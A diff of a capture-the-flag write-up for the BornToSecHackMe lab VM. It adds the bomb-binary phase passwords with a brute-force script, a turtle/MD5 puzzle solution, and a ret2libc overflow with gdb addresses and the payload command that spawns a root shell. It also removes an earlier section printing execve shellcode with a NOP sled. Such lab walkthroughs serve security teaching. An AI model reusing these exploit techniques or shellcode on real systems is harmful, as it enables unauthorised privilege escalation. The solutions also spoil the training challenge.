@@ -2,7 +2,7 @@
 
 ## Writeups Map
 
-![Imgur](https://i.imgur.com/io1rZpf.png)
+![Imgur](https://i.imgur.com/gb4HAhr.png)
 
 ## Summary
 
@@ -18,7 +18,7 @@
 - [10.2 Getting SSH access as laurie](#102-getting-ssh-access-as-laurie)
 - [11.2 Getting SSH access as thor](#112-getting-ssh-access-as-thor)
 - [12. Getting SSH access as zaz](#12-getting-ssh-access-as-zaz)
-- [14.3 Buffer overflow the setuid binary](#143-buffer-overflow-the-setuid-binary)
+- [14.3 Ret2LibC](#144-ret2libc)
 
 ## Exploitation
 
@@ -307,7 +307,194 @@ After compiling all the pieces of code we get this password:
 
 ### 10.2 Getting SSH access as laurie
 
+Once we're connected with ssh as Laurie, we find a binary called bomb. As stated in the readme, it will give us the password of the next user :
 
+```text
+laurie@BornToSecHackMe:~$ cat README 
+Diffuse this bomb!
+When you have all the password use it as "thor" user with ssh.
+
+HINT:
+P
+2
+b
+
+o
+4
+
+NO SPACE IN THE PASSWORD (password is case sensitive).
+```
+
+This bomb is composed of 6 phases. Each phare requires a password to access the next phase, and an invalid password will blow up the bomb.
+
+#### Phase 1
+
+Disassembling the binary, we find this function :
+
+```c
+int __cdecl phase_1(_BYTE *a1)
+{
+    int result; // eax
+
+    result = strings_not_equal(a1, "Public speaking is very easy.");
+    if ( result )
+        explode_bomb();
+    return result;
+}
+```
+
+Here we have our password :
+
+```text
+Public speaking is very easy.
+```
+
+#### Phase 2
+
+```c
+int __cdecl phase_2(char *s)
+{
+    int i; // ebx
+    int result; // eax
+
+    read_six_numbers(s, (int)v3);
+    if ( v3[0] != 1 )
+        explode_bomb();
+    for ( i = 1; i <= 5; ++i )
+    {
+        result = v3[i - 1] * (i + 1);
+        if ( v3[i] != result )
+            explode_bomb();
+    }
+    return result;
+}
+```
+
+The second passord starts with 1, and the next number is result[i - 1] * (i + 1) for i <= 5
+
+```text
+result[0] = 1
+result[1] = 1 * 2 = 2
+result[2] = 2 * 3 = 6
+result[3] = 6 * 4 = 24
+result[4] = 24 * 5 = 120
+result[5] = 120 * 6 = 720
+```
+
+The second password will be :
+
+```text
+1 2 6 24 120 720
+```
+
+#### Phase 3
+
+Here we have a switch/case statement (see [phase3.c pseudocode](LIEN DU PSEUDOCODE))
+
+The first input (v3) enters the corresponding switch/case statement (ex : 0 will lead to case 0)
+
+The second input (v4) needs to be the value of v2 assigned in the above switch case statement (ex : case  0: v2 = 113 -> q in ascii)
+
+The last input (v5) needs to be equal to the value in the if statement (ex : case 0 : v5 != 777)
+
+There are multiple values possible for the password, for instance
+
+```text
+0 q 777
+```
+
+or
+
+```text
+21 b 214
+```
+
+We will have to try every single one of them for the final password.
+
+#### Phase 4
+
+This phase will calculate the fibonnaci sequence of the index given as an argument. The value needs to be 55. This value is obtained at the 10th index (index 9), so this is our password.
+
+[pseudocode](LIEN DU PSEUDOCODE)
+
+#### Phase 5
+
+Looking at the [pseudocode](LIEN DU PSEUDOCODE), the password needs to be 6 characters long.
+
+v3[i] is equal to array_123[index], the index being the last 4 bytes of a1[i].
+v3 needs to contain the string "giants".
+For instance v3[0] must be equal to 'g'.
+We first need convert the values of array_123 to ASCII.
+We see that g corresponds to index 15.
+15 in binary is 1111. Since we only keep the last 4 digits of the value passed, we just need to find a character ending with 1111
+Using this table : http://sticksandstones.kstrom.com/appen.html, we find 2 candidates : 'o' and 'O'
+Rince and repeat for every other characters of "giants"
+
+Once again, there are several alternatives, for instance the password could be :
+
+```text
+Opekma
+```
+
+or
+
+```text
+opeqmq
+```
+
+#### Phase 6
+
+Here the understanding of the code is a bit harder. Looking at the [pseudocode](LIEN DU PSEUDOCODE), however, we can see that :
+
+- There are 6 values
+- The values must be bewteen 1 and 6
+- There is no duplicate
+
+Now, instead of using our brain cells and try to have a full understanding of the program, we can juste try every combination possible, since there are 6! = 720 combinations. That's a small number so it should be pretty fast.
+
+Here is the bash script :
+
+```bash
+#!/bin/sh
+
+python3 - <<EOF
+import itertools
+
+digits = '123456'
+permutations = itertools.permutations(digits)
+with open('permutations.txt', 'w') as f:
+    for perm in permutations:
+        f.write(' '.join(perm) + '\n')
+EOF
+
+STR="Public speaking is very easy.\n1 2 6 24 120 720\n1 b 214\n9\nOpekma\n"
+
+while read -r permutation; do
+    echo "$permutation" >> all.txt
+    echo "$STR$permutation" | ./bomb >> all.txt
+done < permutations.txt
+
+awk '!/blown/{a[NR]=$0} /blown/{for(i=NR-11;i<=NR;i++)delete a[i]} END{for(i in a)print a[i]}' all.txt | awk '/1/ && /2/ && /3/ && /4/ && /5/ && /6/' 
+
+rm all.txt permutations.txt
+```
+
+Once we run it :
+
+```text
+./exploit.sh
+4 2 6 3 1 5
+```
+
+Here we have our password.
+
+The thor password will then be:
+
+```text
+Publicspeakingisveryeasy.126241207201b2149opekmq426135
+```
+
+Because as the subject states, we need to swap the (n-1)th and (n-2)th characters of the password.
 
 > From this step you can continue to all the following steps
 >
@@ -317,7 +504,60 @@ After compiling all the pieces of code we get this password:
 
 ### 11.2 Getting SSH access as thor
 
+Once we login as thor, we can find two text files in the home directory
 
+README:
+
+```text
+thor@BornToSecHackMe:~$ cat README 
+Finish this challenge and use the result as password for 'zaz' user.
+```
+
+and turtle:
+
+```console
+thor@BornToSecHackMe:~$ cat turtle
+Tourne gauche de 90 degrees
+Avance 50 spaces
+Avance 1 spaces
+Tourne gauche de 1 degrees
+Avance 1 spaces
+Tourne gauche de 1 degrees
+Avance 1 spaces
+Tourne gauche de 1 degrees
+Avance 1 spaces
+[...]
+Avance 100 spaces
+Recule 200 spaces
+Avance 100 spaces
+Tourne droite de 90 degrees
+Avance 100 spaces
+Tourne droite de 90 degrees
+Avance 100 spaces
+Recule 200 spaces
+
+Can you digest the message? :)
+```
+
+The name turtle is a reference to the python turtle module. This module allows to draw shapes using instructions given in a python program.
+
+We need to convert the given instructions to a [python code](./scripts/turtle.py), and execute it.
+
+This is the output:
+
+![Imgur](https://i.imgur.com/zoJPY3u.png)
+
+SLASH is written on the screen. But it's not the password for zaz.
+
+The last line of the turtle text files sates 'Can you digest the message?'
+This is a reference to MD5 (Message Digest algorithm). If we hash 'SLASH' :
+
+```text
+    echo -n "SLASH" | md5sum
+    646da671ca01bb5d84dbb5fb2238dc8e
+```
+
+This is the password of the user zaz.
 
 > From this step you can continue to all the following steps
 >
@@ -420,52 +660,64 @@ As we can see, EIP has sucessfully been overwritten. The register value 37654136
 > From this step you can continue to all the following steps
 >
 > - [13. Exploiting DirtyCow](./Writeup5.md#13-exploiting-dirtycow)
-> - [14.3 Buffer overflow the setuid binary](#143-buffer-overflow-the-setuid-binary)
-> - [14.4 Ret2LibC](./Writeup4.md#144-ret2libc)
+> - [14.3 Buffer overflow the setuid binary](./Writeup4.md#143-buffer-overflow-the-setuid-binary)
+> - [14.4 Ret2LibC](#144-ret2libc)
 
-### 14.3 Buffer overflow the setuid binary
+### 14.4 Ret2LibC
 
-We can exploit the EIP overflow by using a shellcode. We can export the shellcode in an environment variable, get its address and pass it to EIP to execute the shellcode.
+> All the following steps can lead here:
+>
+> - [12. Getting SSH access as zaz](./Writeup1.md#12-getting-ssh-access-as-zaz)
 
-We'll be using this shellcode that will call execve using a syscall :
+![Imgur](https://i.imgur.com/nAS93lH.jpg)
+
+Here we'll use the ret-to-libc technique to change the binary's execution flow by re-using existing executable code from the C standard library shared object that is already loaded and mapped into the program's virtual memory space. The return address will be overwritten with a memory address that points to the system() libc function, and we'll pass /bin/sh as the argument in order to spawn a shell. 
+
+We need to find the addresses of system(), exit() and /bin/sh :
 
 ```text
-\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+(gdb) info proc map
+process 2160
+Mapped address spaces:
+
+Start Addr   End Addr       Size     Offset objfile
+ 0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
+ 0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
+0xb7e2b000 0xb7e2c000     0x1000        0x0 
+0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+0xb7fd2000 0xb7fd5000     0x3000        0x0 
+0xb7fda000 0xb7fdd000     0x3000        0x0 
+0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+(gdb) find 0xb7e2c000,0xb7fd2000,"/bin/sh"
+0xb7f8cc58
+1 pattern found.
 ```
 
-[more info here](https://github.com/SERAC-SGM/rainfall-42/tree/main/level02)
+We've got all that we need. We can now craft our payload. Here's the general look:
 
-We export it with a NOP sled in case it's more reliable:
+payload = padding + address of system() + return address of system() + address of "/bin/sh"
+
+In our case, we'll have (addresses in little-endian architecture):
 
 ```text
-\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80
+"A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"
 ```
 
-Next, we locate the address of the environment variable using gdb:
+Let's run it :
 
 ```text
-(gdb) x/500s environ
-0xbffff77c: "\245\370\377\277\265\370\377\277\311\370\377\277\352\370\377\277\375\370\377\277\201\371\377\277\212\371\377\277\253\376\377\277\267\376\377\277\004\377\377\277\027\377\377\277&\377\377\277\064\377\377\277E\377\377\277N\377\377\277]\377\377\277e\377\377\277q\377\377\277\245\377\377\277\305\377\377\277"
-0xbffff7cd: ""
-0xbffff7ce: ""
-0xbffff7cf: ""
-0xbffff7d0: " "
-0xbffff7d2: ""
-[...]
-0xbffff8ea: "SSH_TTY=/dev/pts/0"
-0xbffff8fd: "P=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322Rhn/shh//bi\211\343RS\211\341\260\v̀"
-0xbffff981: "USER=zaz"
-[...]
-
-(gdb) x/s 0xbffff8ff
-0xbffff8ff: "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322Rhn/shh//bi\211\343RS\211\341\260\v̀"
-```
-
-One we have this address, we can send it to the binary with the 140 characters of padding before it (address in little endian):
-
-```text
-zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print("A" * 140 + "\xff\xf8\xff\xbf")')
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print("A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X���
 # whoami
 root
 ```
